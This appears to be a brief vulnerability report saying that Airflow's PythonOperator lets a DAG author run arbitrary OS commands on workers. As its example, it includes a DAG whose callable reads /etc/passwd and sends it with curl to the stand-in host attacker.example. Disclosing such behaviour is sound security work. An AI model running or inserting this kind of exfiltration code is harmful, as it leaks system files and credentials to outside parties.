<!-- SPDX-License-Identifier: Apache-2.0
     https://www.apache.org/licenses/LICENSE-2.0 -->

**Title:** PythonOperator allows DAG author to execute arbitrary OS commands

A DAG author can import the `os` module inside a PythonOperator callable and
call `os.system()` or `subprocess.run()` to execute arbitrary commands on the
Airflow worker. Example:

```python
def malicious():
    import subprocess, os
    subprocess.run(["curl", "http://attacker.example/exfil",
                    "-d", open("/etc/passwd").read()])

with DAG("exfil") as dag:
    PythonOperator(task_id="steal", python_callable=malicious)
```

This allows exfiltration of host credentials and access to other tasks'
environment variables. Tested on Airflow 2.10.1.
